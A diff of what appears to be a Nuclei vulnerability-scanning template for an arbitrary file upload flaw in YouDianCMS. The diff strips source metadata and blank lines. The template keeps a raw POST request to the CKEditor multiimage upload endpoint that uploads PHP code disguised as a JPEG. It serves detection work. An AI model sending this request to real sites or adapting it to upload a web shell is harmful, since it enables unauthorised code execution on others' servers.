@@ -3,12 +3,8 @@ info:
   name: YouDianCMS友点系统任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yqvullzgao9hfs00'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yqvullzgao9hfs00
-    fofa: app="友点建站-CMS"
 http:
 - raw:
   - 'POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
@@ -26,8 +22,6 @@ http:
     Content-Type: multipart/form-data; boundary=cadc403efc1ad12f5fcce44c172baad2
 
 
-
-
     --cadc403efc1ad12f5fcce44c172baad2
 
 
@@ -35,8 +29,6 @@ http:
 
 
     Content-Type: image/jpg
-
-
 
 
     <?php phpinfo();?>
